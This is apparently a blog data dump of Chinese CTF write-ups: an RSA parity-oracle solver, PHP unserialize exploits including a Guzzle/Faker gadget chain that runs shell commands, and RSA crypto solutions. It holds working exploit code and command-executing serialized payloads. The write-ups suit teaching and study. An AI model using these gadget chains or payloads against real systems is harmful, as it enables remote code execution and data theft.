self.recv(prompt=b'[+] Give Me XXXX :')        if len(XXXX) != 4 or sha256(XXXX + proof[4:]).hexdigest().encode() != sha:            return False        return True    def handle(self):        print(1)        signal.alarm(2400)        if not self.proof_of_work():            self.send(b'bye~')            return        self.send(menu)        self.send(('e = ' + hex(e)).encode())        self.send(('N = ' + hex(N)).encode())        while True:            num = self.recv(prompt=b'what\\'s your choise?')            if num == b'1':                c = int(self.recv(prompt=b'the message:').decode(), 16)                m = pow(c, d, N)                if m % 2:                    self.send(b'odd...')                if m % 2 == 0:                    self.send(b'even...')            elif num == b'2':                c = pow(bytes_to_long(flag, e, N))                self.send(('c = ' + hex(c)).encode())            elif num == b'3':                self.send(b'bye~')                return            else:                return        class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer):    passclass ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer):    passif __name__ == \"__main__\":    HOST, PORT = '0.0.0.0', 10000    server = ForkedServer((HOST, PORT), Task)    server.allow_reuse_address = True    print(HOST, PORT)    server.serve_forever()\n先nc一下题目提供的端口：\nncat scr1w.dlut.edu.cn 28088#Output:#[+] sha256(XXXX+iemdocJd) == 419017b5ab02fca75dc806b09ce4bbec1fafe03292d5e17a54551cb2d00b7f40#[+] Give Me XXXX :\n简单的sha256爆破：\nfrom pwn import *from hashlib import sha256from gmpy2 import *def break_sha(last, shav):    s = string.ascii_letters + string.digits    for v1 in s:        for v2 in s:            for v3 in s:                for v4 in s:                    t = (v1 + v2 + v3 + v4).encode() + last                    if sha256(t).hexdigest() == shav:                        return (v1 + v2 + v3 + v4).encode()s1=b'iemdocJd's2=b'ee2571d3f23fb615fdbe01cea04a20352920f0b02c65e06fc14aa71cb20067e1'print(break_sha(s1,s2.decode()))\n#Output:#Give me your information and I'll tell you about the parity after decryption.#Let me see your options...#1.encrypt message#2.get flag#3.exit##e = 0x10001#N = #0xab068236ae895f50991b85a495b05cab628f23408c6847aa19cb91e6b22e5b1a4e67d1c99b36f53da55230a26b496cb60a5092c728a24ffc0e5a195a456481f1e4c82512af6b8003e092045aa0b3dc79c4d12beea95729e6c1fce16215e0ef47d77bb3dc7417006a16af9b88841627c4462608af4e6d4fa8f369d126cf8bbad9#what's your choise?#Input:#2#Output:#c = 0x5fff63ca6bbf96b571128a2502bee3de7be1be0cb84e6f70c2750aaf174475335e0cb59a54a2811154b2c76dd01a2a05660b5485efbfc956d05f254b9fbac53644eea31ea59cc8a8782b4618558aeff0129d85d24dbc0adf431d0929a26803035cff7a2cbc7da52c4dee682078d46e15c2849898fa3defbc700c5878314ae646\n通过输入一个加密的密文，服务器会告诉你用私钥d解密该密文后，所得的明文结果是even还是odd，通过这种机制，我们可以向服务器传入的值进行一些修改操作，我们传入$2e^{c}即为(2m)^{e}，而服务器会将(2m)^e解密成2m后告诉我们其模下的奇偶性。2^{e}c即为(2m)^{e}，而服务器会将(2m)^{e}解密成2m后告诉我们其模下的奇偶性。2^{e}即为(2m)^{e}，而服务器会将(2m)^{e}解密成2m$后告诉我们其模下的奇偶性。\n我们知道任意一个自然数,其与的乘积一定为偶数，所以在下：\n若，即解密后的传入参数没有经过取模操作的话,那么其奇偶性一定为even，因为为偶数\n若，即解密后的传入参数经过了取模操作，那么其奇偶性一定为odd，因为为偶数，为奇数\n根据上面两点我们可以得到以下结论：\n若返回even，则$0&lt;2m0&lt;m&lt;\\frac{2}{n}$\n若返回odd，即\n通过返回的结果，我们可以将明文所在的缩小到原来范围的，若我们继续传入，则可将范围再次缩小\n如此进行下去，我们只需要次即可得到\n\nEXPfrom pwn import *from hashlib import sha256from gmpy2 import *from Crypto.Util.number import *e = 0x10001n = 0x93022347fcf4a51c3a62dc83e93f4dc91dc6331b5541cd912fd7e0891a8419ce77fce50220cff791d9d7ca4f3af19531a3358a0301f85f284441a4ea9b38c84aa7901a11c9f6a5d6305933635294197d2f6cd63f9649ca9669a766e7f802a668d9b265d30fe8b657d369919ad278c52de26fac04e42f750999cce7dd6eb75a0fc = 0xec722e27f20c32794072fa699c7a657bee39134accd623166c785a8e44f22a5523274f68eda3c75a5117ddc9cc13fcfd611a4971530a6e6bf166b3cfdf7e92fd943c17d8b25990bfe24bc7718232789e4e2126b08d7117b4c90aa0702ef83d9cf98583f02c819676535e60c84f918dec8cd57a39dbf2d5a62924339cc00f665def break_sha(last, shav):    s = string.ascii_letters + string.digits    for v1 in s:        for v2 in s:            for v3 in s:                for v4 in s:                    t = (v1 + v2 + v3 + v4).encode() + last                    if sha256(t).hexdigest() == shav:                        return (v1 + v2 + v3 + v4).encode()ldata=0rdata=nnum=0io = remote(\"scr1w.dlut.edu.cn\", 28092)io.recvuntil(b'sha256(XXXX+')str1 = io.recvuntil(b')', drop=True)print(str1)io.recvuntil(b'== ')str2 = io.recvuntil(b'\\n', drop=True)print(str2)res = break_sha(str1, str2.decode())print(res)io.recvuntil(b'[+] Give Me XXXX :')io.sendline(res)while rdata-ldata&gt;2:    num+=1    t=powmod(2,num*e,n)    data=hex((c*t)%n)[2:]    io.recvuntil(b\"what's your choise?\")    io.sendline(b'1')    # io.recvuntil(b'the message:')    io.recv()    io.sendline(data)    ans=io.recvline()    print(ans)    if ans==b'odd...\\n':        ldata = (ldata + rdata) // 2 if (ldata + rdata) % 2 == 0 else (ldata + rdata) // 2 + 1    elif ans==b'even...\\n':        rdata = (ldata + rdata) // 2 if (ldata + rdata) % 2 == 0 else (ldata + rdata) // 2 + 1    print(rdata-ldata)    # print(ldata,rdata)# while powmod(ldata,e,n)!=c:#     ldata-=1print(\"l=\",ldata)print(\"r=\",rdata)print(long_to_bytes(ldata))\n","categories":["CTF"],"tags":["CTF","CRYPTO","RSA"]},{"title":"PHP反序列化-eval()","url":"/2023/03/13/ez_unserialize/","content":"ez_unserializeAnalyze先上题：\n&lt;?phperror_reporting(0);highlight_file(__FILE__);class User{    private $username='name';    private $password='password';    private $class = 'info';    public function __construct(){        $this-&gt;class=new info();    }    public function login($u,$p){        if($this-&gt;username===$u&amp;&amp;$this-&gt;password===$p){            echo \"successfully login\";        }    }    public function __destruct(){        $this-&gt;class-&gt;getInfo();    }}class info{    private $user='xxxxxx';    public function getInfo(){        return $this-&gt;user;    }}class evil{    private $code;    public function getInfo(){        eval($this-&gt;code);    }}$username=$_GET['username'];$password=$_GET['password'];if(isset($username) &amp;&amp; isset($password)){    $user = unserialize($_COOKIE['user']);    $user-&gt;login($username,$password);}\n先找到反序列化的地方$user = unserialize($_COOKIE['user']);，所以是对user进行cookie注入，可以使用cookie editor等插件\n观察到evil类中有eval()函数，其作用是将字符串参数当做代码来执行，所以可以在这里进行攻击\nUser类的构造函数会生成一个新的对象，所以可以在这里改为$this-&gt;class=new evil();\nEXP#payload&lt;?phperror_reporting(0);// highlight_file(__FILE__);class User{    private $username='name';    private $password='password';    private $class;    public function __construct(){        $this-&gt;class=new evil();    }    public function login($u,$p){        if($this-&gt;username===$u&amp;&amp;$this-&gt;password===$p){            echo \"successfully login\";        }    }    public function __destruct(){        $this-&gt;class-&gt;getInfo();    }}class info{    private $user='xxxxxx';    public function getInfo(){        return $this-&gt;user;    }}class evil{    private $code=\"system('cat flag.php');\";    public function getInfo(){        eval($this-&gt;code);    }}$username=$_GET['username'];$password=$_GET['password'];if(isset($username) &amp;&amp; isset($password)){    $user = unserialize($_COOKIE['user']);    $user-&gt;login($username,$password);}$a=new User();echo(urlencode(serialize($a)));?&gt;    #output(cookie)user=O%3A4%3A%22User%22%3A3%3A%7Bs%3A14%3A%22%00User%00username%22%3Bs%3A4%3A%22name%22%3Bs%3A14%3A%22%00User%00password%22%3Bs%3A8%3A%22password%22%3Bs%3A11%3A%22%00User%00class%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D/?username=name&amp;password=password\n即可得到flag\n","categories":["CTF"],"tags":["CTF","WEB","PHP unserialize"]},{"title":"Hello World","url":"/2021/05/01/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\nMore info: Writing\nRun server$ hexo server\nMore info: Server\nGenerate static files$ hexo generate\nMore info: Generating\nDeploy to remote sites$ hexo deploy\nMore info: Deployment\n","categories":["Hello world"],"tags":["Hello world"]},{"title":"PHP反序列化-[QWB 2021]","url":"/2023/03/12/easy-pop/","content":"easy_pop ([QWB 2021] - 赌徒)Analyze进一下端口，只得到I think you need /etc/hint . Before this you need to see the source code，下载一下备份文件/www.zip，得到index.php\n#index.php&lt;meta charset=\"utf-8\"&gt;&lt;?php//hint is in hint.phperror_reporting(1);class Start{    public $name='guest';    public $flag='syst3m(\"cat 127.0.0.1/etc/hint\");';\t    public function __construct(){        echo \"I think you need /etc/hint . Before this you need to see the source code\";    }    public function _sayhello(){        echo $this-&gt;name;        return 'ok';    }    public function __wakeup(){        echo \"hi\";        $this-&gt;_sayhello();    }    public function __get($cc){        echo \"give you flag : \".$this-&gt;flag;        return ;    }}class Info{    private $phonenumber=123123;    public $promise='I do';\t    public function __construct(){        $this-&gt;promise='I will not !!!!';        return $this-&gt;promise;    }    public function __toString(){        return $this-&gt;file['filename']-&gt;ffiillee['ffiilleennaammee'];    }}class Room{    public $filename='/flag';    public $sth_to_set;    public $a='';\t    public function __get($name){        $function = $this-&gt;a;        return $function();    }\t    public function Get_hint($file){        $hint=base64_encode(file_get_contents($file));        echo $hint;        return ;    }    public function __invoke(){        $content = $this-&gt;Get_hint($this-&gt;filename);        echo $content;    }}if(isset($_GET['hello'])){    unserialize($_GET['hello']);}else{    $hi = new  Start();}?&gt;\n从代码中分析可以看出，给hello传参，然后进行序列化攻击。通过对魔术方法和序列化的的学习，我们只能从Start这个类开始下手，当对这个该类进行反序列化时，会自动执行wakeup()方法，而这3个类中只有Start类存在这个方法。再继续观察发现，我们最终需要达到的目的地是Room类的Get_hint()方法。\n所以可以构造payload：\n&lt;?phpinclude \"index.php\";$a = new Start();\t\t\t// __wakeup()进入，$a-&gt;name = new Info();\t\t// Info的__toString()进入$a-&gt;name-&gt;file[\"filename\"] = new Room();\t// Room的__get()进入$a-&gt;name-&gt;file[\"filename\"]-&gt;a= new Room();\t// Room的__invoke()进入echo \"&lt;br&gt;\";echo serialize($a);?&gt;\n序列化后可以得到O:5:\"Start\":2:{s:4:\"name\";O:4:\"Info\":3:{s:17:\"Infophonenumber\";i:123123;s:7:\"promise\";s:15:\"I will not !!!!\";s:4:\"file\";a:1:{s:8:\"filename\";O:4:\"Room\":3:{s:8:\"filename\";s:5:\"/flag\";s:10:\"sth_to_set\";N;s:1:\"a\";O:4:\"Room\":3:{s:8:\"filename\";s:5:\"/flag\";s:10:\"sth_to_set\";N;s:1:\"a\";s:0:\"\";}}}}s:4:\"flag\";s:33:\"syst3m(\"cat 127.0.0.1/etc/hint\");\";}\n反序列化的结果是一片空白，再仔细查看payload发现是Infophonenumber出现了问题，添加上%00即可\n完整payload：/?hello=O:5:\"Start\":2:{s:4:\"name\";O:4:\"Info\":3:{s:17:\"%00Infop%00honenumber\";i:123123;s:7:\"promise\";s:15:\"I will not !!!!\";s:4:\"file\";a:1:{s:8:\"filename\";O:4:\"Room\":3:{s:8:\"filename\";s:5:\"/flag\";s:10:\"sth_to_set\";N;s:1:\"a\";O:4:\"Room\":3:{s:8:\"filename\";s:5:\"/flag\";s:10:\"sth_to_set\";N;s:1:\"a\";s:0:\"\";}}}}s:4:\"flag\";s:33:\"syst3m(\"cat 127.0.0.1/etc/hint\");\";}\n将得到的结果Base64解码后即可得到flag\n","categories":["CTF"],"tags":["CTF","WEB","PHP unserialize"]},{"title":"PHP反序列化-[祥云杯2021 ez_yii]","url":"/2023/03/22/ez-yii/","content":"ez_yii [祥云杯2021]Analyze先上题\nindex.php\n&lt;?phpinclude(\"closure/autoload.php\");function myloader($class){    require_once './class/' . (str_replace('\\\\', '/', $class) . '.php');}spl_autoload_register(\"myloader\"); error_reporting(0);if($_POST['data']){    unserialize(base64_decode($_POST['data']));}else{\techo \"&lt;h1&gt;某ii最新的某条链子&lt;/h1&gt;\";}\nautoload.php\n&lt;?php/* =========================================================================== * Copyright (c) 2018-2019 Zindex Software * * Licensed under the MIT License * =========================================================================== */require_once 'functions.php';spl_autoload_register(function($class){       $class = ltrim($class, '\\\\');    $dir = __DIR__ . '/src';    $namespace = 'Opis\\Closure';        if(strpos($class, $namespace) === 0)    {        $class = substr($class, strlen($namespace));        $path = '';        if(($pos = strripos($class, '\\\\')) !== FALSE)        {            $path = str_replace('\\\\', '/', substr($class, 0, $pos)) . '/';            $class = substr($class, $pos + 1);        }        $path .= str_replace('_', '/', $class) . '.php';        $dir .= '/' . $path;                if(file_exists($dir))        {            include $dir;            return true;        }                return false;    }        return false;});\nfunctions.php\n&lt;?php/* =========================================================================== * Copyright (c) 2018-2019 Zindex Software * * Licensed under the MIT License * =========================================================================== */namespace Opis\\Closure;/** * Serialize * * @param mixed $data * @return string */function serialize($data){    SerializableClosure::enterContext();    SerializableClosure::wrapClosures($data);    $data = \\serialize($data);    SerializableClosure::exitContext();    return $data;}/** * Unserialize * * @param string $data * @param array|null $options * @return mixed */function unserialize($data, array $options = null){    SerializableClosure::enterContext();    $data = ($options === null || \\PHP_MAJOR_VERSION &lt; 7)        ? \\unserialize($data)        : \\unserialize($data, $options);    SerializableClosure::unwrapClosures($data);    SerializableClosure::exitContext();    return $data;}\nRunProcess.php\n&lt;?phpnamespace Codeception\\Extension;class RunProcess{    protected $output;    protected $config = ['sleep' =&gt; 0];    protected static $events = [];    private $processes = [];    public function __destruct()#1    {        $this-&gt;stopProcess();    }    public function stopProcess()#2    {        foreach (array_reverse($this-&gt;processes) as $process) {            if (!$process-&gt;isRunning()) {                continue;            }            $this-&gt;output-&gt;debug('[RunProcess] Stopping ' . $process-&gt;getCommandLine());            $process-&gt;stop();        }        $this-&gt;processes = [];    }}\nDefaultGenerator.php\n&lt;?phpnamespace Faker;class DefaultGenerator{    protected $default;    public function __call($method, $attributes)    {           echo \"def\";        return $this-&gt;default;    }}\nAppendStream.php\n&lt;?phpnamespace GuzzleHttp\\Psr7;class AppendStream{    private $streams = [];#-7    private $seekable = true;    public function __toString()    {        $this-&gt;rewind();        return \"hahaha\";    }    public function rewind()    {        $this-&gt;seek(0);    }    public function seek($offset, $whence = SEEK_SET)    {        echo\"4\";        if (!$this-&gt;seekable) {            throw new \\RuntimeException('This AppendStream is not seekable');        } elseif ($whence !== SEEK_SET) {            throw new \\RuntimeException('The AppendStream can only seek with SEEK_SET');        }        $this-&gt;pos = $this-&gt;current = 0;        // Rewind each stream        foreach ($this-&gt;streams as $i =&gt; $stream) {            try {                $stream-&gt;rewind();#-6            } catch (\\Exception $e) {                throw new \\RuntimeException('Unable to seek stream '                    . $i . ' of the AppendStream', 0, $e);            }        }    }}\nCachingStream.php\n&lt;?phpnamespace GuzzleHttp\\Psr7;class CachingStream{    private $remoteStream;    private $skipReadBytes = 0;    public function rewind()#-5    {        $this-&gt;seek(0);    }    public function seek($offset)#-4    {        $byte = $offset;        $diff = $byte - $this-&gt;stream-&gt;getSize();        if ($diff &gt; 0) {            // Read the remoteStream until we have read in at least the amount            // of bytes requested, or we reach the end of the file.            while ($diff &gt; 0 &amp;&amp; !$this-&gt;remoteStream-&gt;eof()) {                $this-&gt;read($diff);                $diff = $byte - $this-&gt;stream-&gt;getSize();            }        } else {            // We can just do a normal seek since we've already seen this byte.            $this-&gt;stream-&gt;seek($byte);        }    }    public function read($length)    {        // Perform a regular read on any previously read data from the buffer        $data = $this-&gt;stream-&gt;read($length);        $remaining = $length - strlen($data);        // More data was requested so read from the remote stream        if ($remaining) {            // If data was written to the buffer in a position that would have            // been filled from the remote stream, then we must skip bytes on            // the remote stream to emulate overwriting bytes from that            // position. This mimics the behavior of other PHP stream wrappers.            $remoteData = $this-&gt;remoteStream-&gt;read(#-3                $remaining + $this-&gt;skipReadBytes            );            if ($this-&gt;skipReadBytes) {                $len = strlen($remoteData);                $remoteData = substr($remoteData, $this-&gt;skipReadBytes);                $this-&gt;skipReadBytes = max(0, $this-&gt;skipReadBytes - $len);            }            $data .= $remoteData;            $this-&gt;stream-&gt;write($remoteData);        }        return $data;    }}\nPumpStream.php\n&lt;?phpnamespace GuzzleHttp\\Psr7;class PumpStream{    private $source;    private $size;    private $tellPos = 0;    private $metadata;    private $buffer;    public function getSize()    {        return $this-&gt;size;    }    public function read($length)#-2    {        $data = $this-&gt;buffer-&gt;read($length);        $readLen = strlen($data);        $this-&gt;tellPos += $readLen;        $remaining = $length - $readLen;        if ($remaining) {            $this-&gt;pump($remaining);            $data .= $this-&gt;buffer-&gt;read($remaining);            $this-&gt;tellPos += strlen($data) - $readLen;        }        return $data;    }    private function pump($length)#-1    {        if ($this-&gt;source) {            do {                $data = call_user_func($this-&gt;source, $length);                if ($data === false || $data === null) {                    $this-&gt;source = null;                    return;                }                $this-&gt;buffer-&gt;write($data);                $length -= strlen($data);            } while ($length &gt; 0);        }    }}\n这次的代码比较多，需要进行一点点剖析\n进行逆向分析：\n首先观察到在PumpStream.php中存在函数call_user_func()，可以考虑利用，往上逐个观察，函数call_user_func()在函数pump()中，再次往上，函数read()在if($remaining)的条件下会调用函数pump()\n全局搜索函数read()，在CachingStream.php中找到了同名函数read()，可以将其作为跳板，而在函数seek()中，调用了函数read()，又在函数rewind()中被调用\n再次全局搜索函数rewind()，在AppendStream.php中找到了同名函数rewind()，又可以作为跳板\n进行正向分析：\n在RunProcess.php中，函数__destruct()调用了函数stopProcess()，可以联想到使用函数__call()，发现在DefaultGenerator.php中，发现还需要一个函数__toString()，可以在AppendStream.php中找到\n正向逆向分析完成，可以得到如下POP链\n// RunProcess-&gt;__destruct()-&gt;stopProcess()// -&gt;DefaultGenerator-&gt;__call()// -&gt;AppendStream-&gt;__toString()-&gt;rewind()-&gt;seek()// -&gt;CachingStream-&gt;rewind()-&gt;seek()-&gt;read()// -&gt;PumpStream-&gt;read()-&gt;pump()-&gt;call_user_func()\nPOC&lt;?php // RunProcess-&gt;__destruct()-&gt;stopProcess()// -&gt;DefaultGenerator-&gt;__call()// -&gt;AppendStream-&gt;__toString()-&gt;rewind()-&gt;seek()// -&gt;CachingStream-&gt;rewind()-&gt;seek()-&gt;read()// -&gt;PumpStream-&gt;read()-&gt;pump()-&gt;call_user_func()namespace Codeception\\Extension{    use Faker\\DefaultGenerator;    use GuzzleHttp\\Psr7\\AppendStream;    use GuzzleHttp\\Psr7\\CachingStream;    use GuzzleHttp\\Psr7\\PumpStream;    class RunProcess    {        protected $output;        private $processes = ['aaa'=&gt;1];        public function __construct($def=0)        {            echo \"runprocess~~~~~~~~~~~~~~~~~~\";            $this-&gt;output=$def;            $this-&gt;processes['aaa']=$def;                    }    }    $pum=new PumpStream;    $cac=new CachingStream($pum);    $app=new AppendStream($cac);    $def=new DefaultGenerator($app);    $run=new RunProcess($def);    $payload = serialize($run);    echo base64_encode($payload);}namespace Faker{    use GuzzleHttp\\Psr7\\AppendStream;    use GuzzleHttp\\Psr7\\CachingStream;    class DefaultGenerator    {        protected $default;        public function __construct($app=0)        {            echo \"faker~~~~~~~~~~~~~~~~~~\";            $this-&gt;default = $app;        }    }}namespace GuzzleHttp\\Psr7{    class AppendStream    {        private $streams=[];        public function __construct($cac=0)        {            echo \"appengstream~~~~~~~~~~~~~~~~~~\";            $this-&gt;streams[]=$cac;        }    }}namespace GuzzleHttp\\Psr7{    use Faker\\DefaultGenerator;    use GuzzleHttp\\Psr7\\PumpStream as Psr7PumpStream;    class CachingStream    {        private $remoteStream;        public function __construct($pum=0)        {            echo \"cachingstream~~~~~~~~~~~~~~~~~~\";            $this-&gt;stream=$pum;            $this-&gt;remoteStream=new DefaultGenerator(NULL);        }    }    class PumpStream    {        private $source;        private $size;        private $tellPos = 0;        private $metadata;        private $buffer;        public function __construct()        {            echo \"pumpstream~~~~~~~~~~~~~~~~~~\";            include(\"closure/autoload.php\");            $this-&gt;size=-1;            $def=new DefaultGenerator('aaaaaa');            $this-&gt;buffer=new CachingStream($def);            $fun=function()            {                system(\"cd / &amp;&amp; cat flag\");            };            $f=(\\Opis\\Closure\\serialize($fun));            $this-&gt;source=unserialize($f);        }    }}\n反序列化后对data进行POST传参即可得到flag\n","categories":["CTF"],"tags":["CTF","WEB","PHP unserialize"]},{"title":"pqpq [SECCON2022]","url":"/2023/03/22/pqpq/","content":"pqpq [SECCON2022]Analyze先上题\nfrom Crypto.Util.number import *from Crypto.Random import *from flag import flagp = getPrime(512)q = getPrime(512)r = getPrime(512)n = p * q * re = 2 * 65537assert n.bit_length() // 8 - len(flag) &gt; 0padding = get_random_bytes(n.bit_length() // 8 - len(flag))m = bytes_to_long(padding + flag)assert m &lt; nc1p = pow(p, e, n)c1q = pow(q, e, n)cm = pow(m, e, n)c1 = (c1p - c1q) % nc2 = pow(p - q, e, n)print(f\"e = {e}\")print(f\"n = {n}\")# p^e - q^e mod nprint(f\"c1 = {c1}\")# (p-q)^e mod nprint(f\"c2 = {c2}\")# m^e mod nprint(f\"cm = {cm}\")# e = 131074# n = 587926815910957928506680558951380405698765957736660571041732511939308424899531125274073420353104933723578377320050609109973567093301465914201779673281463229043539776071848986139657349676692718889679333084650490543298408820393827884588301690661795023628407437321580294262453190086595632660415087049509707898690300735866307908684649384093580089579066927072306239235691848372795522705863097316041992762430583002647242874432616919707048872023450089003861892443175057# c1 = 92883677608593259107779614675340187389627152895287502713709168556367680044547229499881430201334665342299031232736527233576918819872441595012586353493994687554993850861284698771856524058389658082754805340430113793873484033099148690745409478343585721548477862484321261504696340989152768048722100452380071775092776100545951118812510485258151625980480449364841902275382168289834835592610827304151460005023283820809211181376463308232832041617730995269229706500778999# c2 = 46236476834113109832988500718245623668321130659753618396968458085371710919173095425312826538494027621684566936459628333712619089451210986870323342712049966508077935506288610960911880157875515961210931283604254773154117519276154872411593688579702575956948337592659599321668773003355325067112181265438366718228446448254354388848428310614023369655106639341893255469632846938342940907002778575355566044700049191772800859575284398246115317686284789740336401764665472# cm = 357982930129036534232652210898740711702843117900101310390536835935714799577440705618646343456679847613022604725158389766496649223820165598357113877892553200702943562674928769780834623569501835458020870291541041964954580145140283927441757571859062193670500697241155641475887438532923910772758985332976303801843564388289302751743334888885607686066607804176327367188812325636165858751339661015759861175537925741744142766298156196248822715533235458083173713289585866\n目前我们只知道，，稍加分析：\n\n\\begin{align}\nc_1&=p^e-q^e&(mod\\ n)\\\\\nc_2&=(p-q)^e\\\\\n&=p^e-p^{e-1}q+...-pq^{e-1}+q^e&(mod\\ n)\\\\\nc_1+c_2&=(p^e-q^e)+(p^e-p^{e-1}q+...-pq^{e-1}+q^e)\\\\\n&=(p^e+p^e-p^{e-1}+...-pq^{e-1})+(q^e-q^e)\\\\\n&=p(p^{e-1}+p^{e-1}-p^{e-2}q+...-q^{e-1})\\\\\n&=k_1p&(mod\\ n)\\\\\nc_1-c_2&=(p^e-q^e)-(p^e-p^{e-1}q+...-pq^{e-1}+q^e)\\\\\n&=(p^e-p^e)+(-q^e+p^{e-1}q-...+pq^{e-1}-q^e)\\\\\n&=q(-q^{e-1}+p^{e-1}-...+pq^{e-2}-q^{e-1})\\\\\n&=k_2q&(mod\\ n)\\\\\ngcd(c_1+c_2,n)&=gcd(k_1p,n)\\\\\n&=gcd(k_1p,pqr)\\\\\n&=p\\\\\ngcd(c_1-c_2,n)&=gcd(k_2q,n)\\\\\n&=gcd(k_2q,pqr)\\\\\n&=q\\\\\nr&=\\frac{n}{pq}\\\\\n\\end{align}到此我们便可获得p，q，r\n由于，并不与互素，无法直接计算逆元d，但我们知道p，q，r的值，所以便可计算的8个可能值，筛选后即可得到flag\nEXPfrom Crypto.Util.number import *from sympy.ntheory.modular import *from gmpy2 import *from itertools import *e = 131074n = 587926815910957928506680558951380405698765957736660571041732511939308424899531125274073420353104933723578377320050609109973567093301465914201779673281463229043539776071848986139657349676692718889679333084650490543298408820393827884588301690661795023628407437321580294262453190086595632660415087049509707898690300735866307908684649384093580089579066927072306239235691848372795522705863097316041992762430583002647242874432616919707048872023450089003861892443175057c1 = 92883677608593259107779614675340187389627152895287502713709168556367680044547229499881430201334665342299031232736527233576918819872441595012586353493994687554993850861284698771856524058389658082754805340430113793873484033099148690745409478343585721548477862484321261504696340989152768048722100452380071775092776100545951118812510485258151625980480449364841902275382168289834835592610827304151460005023283820809211181376463308232832041617730995269229706500778999c2 = 46236476834113109832988500718245623668321130659753618396968458085371710919173095425312826538494027621684566936459628333712619089451210986870323342712049966508077935506288610960911880157875515961210931283604254773154117519276154872411593688579702575956948337592659599321668773003355325067112181265438366718228446448254354388848428310614023369655106639341893255469632846938342940907002778575355566044700049191772800859575284398246115317686284789740336401764665472cm = 357982930129036534232652210898740711702843117900101310390536835935714799577440705618646343456679847613022604725158389766496649223820165598357113877892553200702943562674928769780834623569501835458020870291541041964954580145140283927441757571859062193670500697241155641475887438532923910772758985332976303801843564388289302751743334888885607686066607804176327367188812325636165858751339661015759861175537925741744142766298156196248822715533235458083173713289585866p=gcd(c1+c2,n)q=gcd(c1-c2,n)r=n//p//q#Tonelli-Shanksdef legendre(a, p):    return pow(a, (p - 1) // 2, p)def tonelli(n, p):    r = []    assert legendre(n, p) == 1, \"not a square (mod p)\"    q = p - 1    s = 0    while q % 2 == 0:        q //= 2        s += 1    if s == 1:        return pow(n, (p + 1) // 4, p)    for z in range(2, p):        if p - 1 == legendre(z, p):            break    c = pow(z, q, p)    r = pow(n, (q + 1) // 2, p)    t = pow(n, q, p)    m = s    t2 = 0    while (t - 1) % p != 0:        t2 = (t * t) % p        for i in range(1, m):            if (t2 - 1) % p == 0:                break            t2 = (t2 * t2) % p        b = pow(c, 1 &lt;&lt; (m - i - 1), p)        r = (r * b) % p        c = (b * b) % p        t = (t * c) % p        m = i    return rphi=(p-1)*(q-1)*(r-1)dp=invert(e//2,p-1)dq=invert(e//2,q-1)dr=invert(e//2,r-1)mp2=pow(cm,dp,p)mq2=pow(cm,dq,q)mr2=pow(cm,dr,r)mp=tonelli(mp2,p)mq=tonelli(mq2,q)mr=tonelli(mr2,r)print(mp)print(mq)print(mr)'''for _mp, _mq, _mr in product([mp, p - mp], [mq, q - mq], [mr, r - mr]):    m = [p, q, r]    v = [_mp, _mq, _mr]    print(long_to_bytes(crt(m, v)[0]))'''for mp1,mq1,mr1 in product([mp,p-mp],[mq,q-mq],[mr,r-mr]):    x=[mp1,mq1,mr1]    y=[p,q,r]    print(long_to_bytes(crt(y,x)[0]))\n","categories":["CTF"],"tags":["CTF","CRYPTO","RSA"]},{"title":"superprime [HITCON 2022]","url":"/2023/03/22/superprime/","content":"superprime [HITCON2022]Analyze先上题\ntask.py\nfrom Crypto.Util.number import getPrime, isPrime, bytes_to_longdef getSuperPrime(nbits):    while True:        p = getPrime(nbits)        pp = bytes_to_long(str(p).encode())        if isPrime(pp):            return p, ppp1, q1 = getSuperPrime(512)p2, q2 = getSuperPrime(512)p3, q3 = getSuperPrime(512)p4, q4 = getSuperPrime(512)p5, q5 = getSuperPrime(512)n1 = p1 * q1n2 = p2 * p3n3 = q2 * q3n4 = p4 * q5n5 = p5 * q4e = 65537c = bytes_to_long(open(\"flag.txt\", \"rb\").read().strip())for n in sorted([n1, n2, n3, n4, n5]):    c = pow(c, e, n)print(f\"{n1 = }\")print(f\"{n2 = }\")print(f\"{n3 = }\")print(f\"{n4 = }\")print(f\"{n5 = }\")print(f\"{e = }\")print(f\"{c = }\")\noutput.txt\nn1 = 132240475872174910020944408159013384770525986234801028624784519134365862704105251340824787510945183963356820885920367304711310957365047441178683686926111455575911962257698539064559510444855775549001648292058855493337857073693460061212792795075263084221929517773754699732129582794061997056827998985829666251060653380798686353779510948629280009197715644814616657550158740378670095210797455828266323922570838468050733341304227070902756780052159113811360169205531739117518635829837403006788948761106892086004133969899267757339921n2 = 95063555614573541810575593850289506856925979977609991181205616159125089261546784721154599484613262518469706157215924537125160406418217535531993036958388330505871763176297570429533467696205928686731756713059807727405313286020007347211892135226632724359291407913539632339885950358476265995466145680878334722001n3 = 59077122528757446350604269162079270359932342538938986760275099248290981958441838384256597839386787448447136083450980256330743221155636885358548541847176342745397373638152767362253944731433134474562146358334422503033973244936835557423934491676324297243326613498319086748647812745223753746779568080090592100960499863677438403657325762852705171109382084916335379889394829715777901290096314487661584614712488781379507151355301063123233880909931925363322846957197537676660047824476129446066149857051131731840540157488590899311381370266592295206055792990886734933291304077440476730373491475852882163732120626849448728573574411786320772125534383707413572678316508826450778346723441956945169297689138799298561759843280317867927205551400065163199599457n4 = 24589423756497058585126900932611669798817346035509889383925628660158156567930038333401661451846451875869437263666365776498658699865323180836374906288949824205543130261556051807217164348291174483234810669420041361857307271050079366739157441129916338485838528114129985080841445467007786565727910355311119650431197742495274527401569906785121880408809802492383216836691265423297722021017515667257863302820657924121913047547741420413553737917632809270380269758313556777803344394624408862183672919570479289614998783678080936272369083n5 = 185885020243714550225131939334004568560534422416697599024696590344782893162219788079305752632863387855011040772104676488940707663157284194641170875157382507202789029285286466326803699701161968587945867047101502048926016515139728368809523009828247173096909917611001113266938209226483162533302629909322412013492978440863258135181226831155024690292336026753678424906151360739424148666951389956182136072508650529271179749569637083537783283360860102371562796635391549934474381821125255176073752645643893294533330184238070085333427e = 65537c = 